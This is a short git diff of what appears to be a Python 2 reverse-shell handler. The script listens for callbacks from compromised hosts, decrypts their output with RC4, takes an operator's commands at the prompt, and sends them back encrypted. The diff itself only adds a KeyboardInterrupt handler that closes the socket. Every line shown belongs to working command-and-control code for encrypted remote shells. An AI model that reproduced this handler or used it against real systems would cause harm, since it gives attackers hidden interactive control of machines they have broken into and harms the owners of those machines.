@@ -56,17 +56,20 @@ if __name__ == "__main__":
 	s.listen(1)
 	
 	print "[*] Waiting for a connection..."
-	while True:
-		conn, addr = s.accept()
-		print "[+] Callback from %s:%d" % (addr[0], addr[1])
-		
-		data = True
-		while data:
-			data = conn.recv(4096)
-			data = RC4(data, key)
-			cmd = raw_input(data)
-			if cmd == "":
-				cmd = ";"
-			cmd = RC4(cmd, key)
-			conn.send(cmd)
-	
+	try:
+		while True:
+			conn, addr = s.accept()
+			print "[+] Callback from %s:%d" % (addr[0], addr[1])
+			
+			data = True
+			while data:
+				data = conn.recv(4096)
+				data = RC4(data, key)
+				cmd = raw_input(data)
+				if cmd == "":
+					cmd = ";"
+				cmd = RC4(cmd, key)
+				conn.send(cmd)
+	except KeyboardInterrupt:
+		s.close()
+		exit(0)
